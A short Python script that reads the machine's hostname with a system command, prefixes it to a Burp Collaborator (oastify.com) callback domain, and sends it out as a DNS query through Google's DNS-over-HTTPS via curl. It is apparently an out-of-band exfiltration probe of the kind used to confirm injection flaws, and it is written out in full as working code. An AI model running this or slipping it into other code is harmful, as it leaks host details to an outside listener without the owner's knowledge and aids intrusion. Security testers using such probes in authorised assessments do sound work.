import subprocess
import base64
import socket

# Configuration
MY_DOMAIN = "1acum6lrmjzm3pw55u272yoz8qeh2lqa.oastify.com"  # Replace with your actual domain placeholder

# Retrieve hostname using system command and construct full domain
try:
    hostname_result = subprocess.run(['hostname'], capture_output=True, text=True, check=True)
    hostname = hostname_result.stdout.strip()
except subprocess.CalledProcessError:
    raise RuntimeError("Failed to retrieve hostname via system command")

full_domain = f"{hostname}.{MY_DOMAIN}"

# Encode the domain name in DNS wire format (length-prefixed labels + null terminator)
labels = full_domain.split('.')
name_encoded = b''.join(bytes([len(label)]) + label.encode('ascii') for label in labels) + b'\x00'

# DNS message header (transaction ID: 0xabcd, standard query flags, 1 question)
header = b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'

# Question section suffix (A record type: 0x0001, IN class: 0x0001)
tail = b'\x00\x01\x00\x01'

# Assemble full binary DNS message
msg = header + name_encoded + tail

# Encode in base64url format (URL-safe, no padding)
encoded = base64.urlsafe_b64encode(msg).rstrip(b'=').decode('ascii')

# Construct the DoH query URL
url = f"https://dns.google/dns-query?dns={encoded}"

# Perform the HTTP request using subprocess and curl
try:
    curl_result = subprocess.run(
        ['curl', '-H', 'accept: application/dns-message', url],
        capture_output=True,
        check=True
    )
    dns_response = curl_result.stdout
except subprocess.CalledProcessError as e:
    raise RuntimeError(f"Failed to execute curl command: {e}")

# Output the binary DNS response (as in the equivalent curl command)
print(dns_response)
